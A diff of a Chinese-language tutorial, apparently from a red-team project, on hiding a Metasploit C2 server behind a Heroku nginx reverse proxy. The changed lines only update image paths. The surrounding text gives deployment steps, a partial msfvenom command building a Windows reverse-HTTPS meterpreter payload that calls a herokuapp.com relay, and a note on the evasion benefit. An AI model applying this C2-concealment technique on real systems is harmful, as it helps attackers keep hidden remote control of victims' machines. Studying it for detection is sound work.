@@ -44,12 +44,12 @@ Heroku是一个支持多种编程语言的云平台即服务。简单理解就�
 + 注册成功以后登录，登录以后点击 [部署链接](https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku),
 + app名称填写为 `mydiydomain` (可自定义,名称为后续域名前缀)，TARGET环境变量填写为C2的handler地址
 
-![1603771065455-e03973a0-8763-4402-8b92-db358f8d0b1f.webp](./img/2q91t2VyvScAis4f/1603771065455-e03973a0-8763-4402-8b92-db358f8d0b1f-908601.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\1.webp)
 
 + 然后点击 Deploy app 系统会自动部署.
 + 在metasploit-framework中添加handler,配置如图
 
-![1603771665090-ad5c1ecd-c257-44f3-9128-4430183a2e34.webp](./img/2q91t2VyvScAis4f/1603771665090-ad5c1ecd-c257-44f3-9128-4430183a2e34-815196.webp)![1603771713694-163331e4-cb96-4bb9-aa79-84980ab9c4ee.webp](./img/2q91t2VyvScAis4f/1603771713694-163331e4-cb96-4bb9-aa79-84980ab9c4ee-199518.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\2.webp)![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\3.webp)
 
 
 
@@ -65,15 +65,15 @@ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=mydiydomain.herokuapp.co
 # 运行效果
 + 在metasploit-framework中查看session如下,可以看到session的链接地址为heroku中转服务器地址
 
-![1603772048769-0192b120-768f-45ef-986f-4c13d4c1fae4.webp](./img/2q91t2VyvScAis4f/1603772048769-0192b120-768f-45ef-986f-4c13d4c1fae4-265798.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\4.webp)
 
 + 在目标机抓包效果如下
 
-![1603772254394-2251f568-89ae-48de-9c55-36b864bbffb0.webp](./img/2q91t2VyvScAis4f/1603772254394-2251f568-89ae-48de-9c55-36b864bbffb0-297458.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\5.webp)
 
-![1603772434299-3721e8f1-0eae-4296-b735-a741b20830d8.webp](./img/2q91t2VyvScAis4f/1603772434299-3721e8f1-0eae-4296-b735-a741b20830d8-167182.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\6.webp)
 
-![1603772464467-3e81edaf-c634-42de-8e79-8ef5091a7c03.webp](./img/2q91t2VyvScAis4f/1603772464467-3e81edaf-c634-42de-8e79-8ef5091a7c03-188615.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\7.webp)
 
 # 总结
 heroku隐藏C2从技术原理上看非常简单,使用heroku服务部署nginx反向代理服务,payload连接heroku的nginx,nginx将流量转发到C2.具体优势如下:
